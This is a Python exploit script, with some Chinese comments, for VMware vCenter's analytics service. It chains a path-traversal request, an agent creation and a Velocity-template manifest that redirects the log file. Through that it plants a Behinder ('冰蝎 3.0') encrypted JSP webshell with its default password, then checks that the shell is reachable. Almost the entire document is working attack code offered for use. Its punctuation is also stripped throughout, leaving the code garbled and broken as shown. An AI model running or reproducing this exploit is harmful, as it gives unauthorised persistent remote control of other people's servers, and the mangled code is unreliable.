import requests
import random
import string
import sys
import time
import requests
import urllib3
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
def id_generator(size=6, chars=string.ascii_lowercase + string.digits)
 return ''.join(random.choice(chars) for _ in range(size))
  
def escape(_str)
 _str = _str.replace(&, &amp;)
 _str = _str.replace(, &lt;)
 _str = _str.replace(, &gt;)
 _str = _str.replace(, &quot;)
 return _str
  
def str_to_escaped_unicode(arg_str)
 escaped_str = ''
 for s in arg_str
   val = ord(s)
   esc_uni = u{04x}.format(val)
   escaped_str += esc_uni
 return escaped_str
 
 
def createAgent(target, agent_name, log_param)
 
  
 url = %sanalyticsceipsdk..;..;..;analyticsphapidataappagent_c=%s&_i=%s % (target, agent_name, log_param)
 headers = { Cache-Control max-age=0, 
       Upgrade-Insecure-Requests 1, 
       User-Agent Mozilla5.0, 
       X-Deployment-Secret abc, 
       Content-Type applicationjson, 
       Connection close }
       
 json_data = { manifestSpec{}, 
        objectType a2,
        collectionTriggerDataNeeded True,
        deploymentDataNeededTrue, 
        resultNeeded True, 
        signalCollectionCompletedTrue, 
        localManifestPath a7,
        localPayloadPath a8,
        localObfuscationMapPath a9 }
         
 requests.post(url, headers=headers, json=json_data, verify=False)
  
 
def generate_manifest(webshell_location, webshell)
 
 manifestData = manifest recommendedPageSize=500
   request
    query name=virVCenter
      constraint
       targetTypeServiceInstancetargetType
      constraint
      propertySpec
       propertyNamescontent.about.instanceUuidpropertyNames
       propertyNamescontent.about.osTypepropertyNames
       propertyNamescontent.about.buildpropertyNames
       propertyNamescontent.about.versionpropertyNames
      propertySpec
    query
   request
   cdfMapping
    indepedentResultsMapping
      resultSetMappings
       entry
         keyvirVCenterkey
         value
                      value xmlnsxsi=httpwww.w3.org2001XMLSchema-instance xsitype=resultSetMapping
            resourceItemToJsonLdMapping
             forTypeServiceInstanceforType
            mappingCode![CDATA[  
             #set($appender = $GLOBAL-logger.logger.parent.getAppender(LOGFILE))##
             #set($orig_log = $appender.getFile())##
             #set($logger = $GLOBAL-logger.logger.parent)##  
             $appender.setFile(%s)##  
             $appender.activateOptions()## 
             $logger.warn(%s)## 
             $appender.setFile($orig_log)##  
             $appender.activateOptions()##]]
            mappingCode
            resourceItemToJsonLdMapping
          value
         value
       entry
      resultSetMappings
    indepedentResultsMapping
   cdfMapping
   requestSchedules
    schedule interval=1h
      queries
       queryvirVCenterquery
      queries
    schedule
   requestSchedules
 manifest % (webshell_location, webshell)
  
 return manifestData
 
def arg()
 parser = argparse.ArgumentParser()
 parser.add_argument(-t, --target, help = Target, required = True)
 args = parser.parse_args()
 target = args.target
 print([] Target %s % target)
 return target
 
def exec()
 target = arg()
 # Variables
 webshell_param = id_generator(6)
 log_param = id_generator(6)
 agent_name = id_generator(6)
 shell_name = Server.jsp
 webshell = %@page import=java.util.,javax.crypto.,javax.crypto.spec.%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%%if (request.getMethod().equals(POST)){String k=e45e329feb5d925b;该密钥为连接密码32位md5值的前16位，默认连接密码rebeyondsession.putValue(u,k);Cipher c=Cipher.getInstance(AES);c.init(2,new SecretKeySpec(k.getBytes(),AES));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%
 
 webshell_location = usrlibvmware-ssovmware-stswebappsROOT%s % shell_name
 webshell = str_to_escaped_unicode(webshell)
 manifestData = generate_manifest(webshell_location,webshell)
 print([] Creating Agent)
 createAgent(target, agent_name, log_param)
 url = %sanalyticsceipsdk..;..;..;analyticsphapidataappagentaction=collect&_c=%s&_i=%s % (target, agent_name, log_param)
 headers = {Cache-Control max-age=0, 
          Upgrade-Insecure-Requests 1, 
          User-Agent Mozilla5.0, 
          X-Deployment-Secret abc, 
          Content-Type applicationjson, 
          Connection close}
 json_data ={contextData a3, manifestContent manifestData, objectId a2}
 requests.post(url, headers=headers, json=json_data, verify=False)
 #webshell连接地址
 url = %sidm..;%s % (target, shell_name)
 code = requests.get(url=url, headers=headers,verify=False).status_code
 if code != 404
   print(webshell地址 %s % url)
   print([]冰蝎3.0 Webshell连接密码 rebeyond )
 
 else
   print(未获取到webshell地址)
 
 
if __name__ == '__main__'
 exec()